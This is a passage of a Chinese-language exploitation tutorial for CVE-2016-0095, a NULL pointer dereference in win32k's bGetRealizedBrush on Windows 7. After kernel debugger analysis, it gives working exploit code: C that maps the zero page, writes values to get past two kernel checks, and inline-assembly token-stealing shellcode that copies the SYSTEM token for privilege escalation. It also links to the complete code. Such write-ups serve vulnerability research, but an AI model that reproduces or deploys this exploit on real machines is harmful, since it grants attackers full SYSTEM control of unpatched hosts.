    97ffaa5c  fdeac018 97ffaa7c 97ffaaf8 fda86d60
    97ffaa6c  00000d0d 1c010886 0016fe9c 95e3b864
    97ffaa7c  00023300 00000000 00000000 00000008
    97ffaa8c  00000008 00000001 83e7bf6b 842188ea
    97ffaa9c  00cff155 00000000 00000000 00026161
    97ffaaac  fe9c3008 97ffab7c 97ffaafc 00010001
    97ffaabc  87051c35 00000000 00000000 0003767c
    97ffaacc  00000000 0003767c 00000000 00026161
`EngPaint`函数参数信息如下
    int __stdcall EngPaint(struct _SURFOBJ *a1, int a2, struct _BRUSHOBJ *a3, struct _POINTL *a4, unsigned int a5)
根据参数信息我们可以得到下面这两个关键参数
  * _SURFOBJ => fdeac018
  * _BRUSHOBJ => 97ffaaf8
我们在`bGetRealizedBrush`处下断，找到这两个参数的位置，根据计算由`_BRUSHOBJ`推出了`_SURFOBJ`
    3: kd> ba e1 win32k!bGetRealizedBrush
    3: kd> g
    Breakpoint 2 hit
    win32k!bGetRealizedBrush:
    95d40528 8bff            mov     edi,edi
    3: kd> r
    eax=fdb436e0 ebx=00000000 ecx=00000001 edx=00000000 esi=97ffaaf8 edi=fdeac008
    eip=95d40528 esp=97ffa9a4 ebp=97ffa9b8 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
    win32k!bGetRealizedBrush:
    95d40528 8bff            mov     edi,edi
    3: kd> dd esp
    97ffa9a4  95d434af fdb436e0 97ffaaf8 95d3d5a0
    97ffa9b4  97ffaaf8 97ffaa1c 95db9b5e 97ffaaf8
    97ffa9c4  00000001 97ffaa7c fdeac018 84218cca
    97ffa9d4  00d14c9b 97ffa9e8 83e80c61 83e3fd72
    97ffa9e4  97ffac20 95e3b697 badb0d00 ffb8e748
    97ffa9f4  00000000 95dc3098 95e3b864 95e3bb98
    97ffaa04  95d40528 00000000 00004000 00000000
    97ffaa14  00000000 00000000 97ffaa54 95e3b6e8
    3: kd> dd 97ffaaf8 => _BRUSHOBJ
    97ffaaf8  ffffffff 00000000 00000000 00edfc13
    97ffab08  00edfc13 00000000 00000006 00000004
    97ffab18  00000000 00ffffff fda867c4 00000000
    97ffab28  00000000 fdeac008 ffbff968 ffbffe68
    97ffab38  ffa1d3a0 00000006 fdb436e0 00000014
    97ffab48  00000312 00000001 ffffffff 83f2ff01
    97ffab58  83e78892 97ffab7c 97ffabb0 00000000
    97ffab68  97ffac10 84218924 00000000 00000000
    3: kd> dd poi(97ffaaf8+34h)+10h => _SURFOBJ
    fdeac018  00000000 1f850931 00000000 00000000
    fdeac028  00000008 00000008 00000020 fdeac15c
    fdeac038  fdeac15c 00000004 00002296 00000001
    fdeac048  02010000 00000000 04000000 00000000
    fdeac058  ffbff968 00000000 00000000 00000000
    fdeac068  00000000 00000000 00000001 00000000
    fdeac078  00000000 00000000 00000000 00000000
    fdeac088  00000000 fdeac08c fdeac08c 00000000
我们在微软官方可以查询到[_SURFOBJ](https://docs.microsoft.com/zh-cn/windows/win32/api/winddi/ns-winddi-surfobj)的结构，总结而言就是`_SURFOBJ->hdev`结构为零引用导致蓝屏
    typedef struct _SURFOBJ {
      DHSURF dhsurf;
      HSURF  hsurf;
      DHPDEV dhpdev;
      HDEV   hdev;
      SIZEL  sizlBitmap;
      ULONG  cjBits;
      PVOID  pvBits;
      PVOID  pvScan0;
      LONG   lDelta;
      ULONG  iUniq;
      ULONG  iBitmapFormat;
      USHORT iType;
      USHORT fjBitmap;
    } SURFOBJ;
# 0x02：漏洞利用
从上面的分析我们知道，漏洞的原理是空指针解引用，利用的话肯定是在零页构造内容从而绕过检验，最后运行我们的ShellCode，我们现在需要在`bGetRealizedBrush`函数中寻找可以给我们利用的片段，从而达到`call
ShellCode`提权的目的，我们可以在IDA中发现以下可能存在的几个片段
  * 第一处
  * 第二处
看到第二个片段其实第一个片段都可以忽略了，因为[ebp+arg_8]的位置我们是不可以控制的，而第二个片段edi来自[eax+748h]，所以我们是完完全全可以在零页构造这个结构的，我们只需要将[eax+748h]设置为我们shellcode的位置即可达到提权的目的，我们现在的目标已经清楚了，现在就是观察从漏洞触发点到我们
call edi 之间的一些判断，我们需要修改一些判断从而达到运行我们shellcode的目的，我们首先申请零页内存，运行代码查看函数运行轨迹
    int main(int argc, char* argv[])
    {
        *(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
            GetModuleHandleW(L"ntdll"),
            "NtAllocateVirtualMemory");
        if (NtAllocateVirtualMemory == NULL)
        {
            printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
            system("pause");
            return 0;
        }
        PVOID Zero_addr = (PVOID)1;
        SIZE_T RegionSize = 0x1000;
        printf("[+]Started to alloc zero page...\n");
        if (!NT_SUCCESS(NtAllocateVirtualMemory(
            INVALID_HANDLE_VALUE,
            &Zero_addr,
            0,
            &RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE)) || Zero_addr != NULL)
        {
            printf("[+]Failed to alloc zero page!\n");
            system("pause");
            return 0;
        }
        Trigger_BSoDPoc();
        return 0;
    }
我们单步运行可以发现，我们要到黄色区域必须修改第一处判断，不然程序就不会走到我们想要的地方，然而第一处判断我们只需要让[eax+590h]不为零即可，所以构造如下片段
    *(DWORD*)(0x590) = (DWORD)0x1;
第二处判断类似，就在第一处的右下角
    *(DWORD*)(0x592) = (DWORD)0x1;
最后一步就是放上我们的shellcode了，只是在构造的时候我们需要给他四个参数，当然也可以直接在shellcode里平衡堆栈
    ; IDA 里的片段
    ...
    mov     edi, [eax+748h]
    ...
    push    ecx
    push    edx
    push    [ebp+var_14]
    push    eax
    call    edi
所以我们构造如下片段即可
    int __stdcall ShellCode(int parameter1,int parameter2,int parameter3,int parameter4)
    {
        _asm
        {
            pushad
            mov eax, fs: [124h]     // Find the _KTHREAD structure for the current thread
            mov eax, [eax + 0x50]   // Find the _EPROCESS structure
            mov ecx, eax
            mov edx, 4              // edx = system PID(4)
            // The loop is to get the _EPROCESS of the system
            find_sys_pid :
                         mov eax, [eax + 0xb8]  // Find the process activity list
                         sub eax, 0xb8          // List traversal
                         cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
                         jnz find_sys_pid
                         // Replace the Token
                         mov edx, [eax + 0xf8]
                         mov[ecx + 0xf8], edx
                         popad
        }
        return 0;
    }
    *(DWORD*)(0x748) = (DWORD)& ShellCode;
最后整合一下思路：
  * 申请零页内存
  * 绕过判断(两处)
  * 放置shellcode
  * 调用`Trigger_BSoDPoc`函数运行shellcode提权
详细的代码参考 => [这里](https://github.com/ThunderJie/CVE/tree/master/CVE-2016-0095)
# 0x03：后记
因为是有Poc构造Exploit，所以我们这里利用起来比较轻松，win 7 x64利用也比较简单，修改相应偏移即可
参考资料：
[+]
k0shl师傅的分析：